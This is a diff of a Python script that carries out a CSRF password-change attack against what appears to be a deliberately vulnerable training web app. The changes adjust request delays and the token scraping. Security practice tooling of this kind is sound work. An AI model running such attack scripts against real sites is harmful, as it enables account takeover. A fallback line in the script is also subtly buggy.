@@ -19,7 +19,7 @@ else:
     print("Base URL and/or request rate were not provided.")
     sys.exit(1)
 
-delays = {'low': 15, 'medium': 2, 'high': 0.5}
+delays = {'low': 10, 'medium': 5, 'high': 3}
 delay = delays.get(request_rate, 'medium')
 
 csrf_url = f"{base_url}/vulnerabilities/csrf/"
@@ -65,7 +65,7 @@ def csrf_attack():
     # Get CSRF page for initial CSRF token
     response = session.get(csrf_url)
     soup = BeautifulSoup(response.text, 'html.parser')
-    user_token = soup.find('input', {'name': 'user_token'}).get('value')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
 
     # Prepare the data for the CSRF attack (changing the password)
     data = {
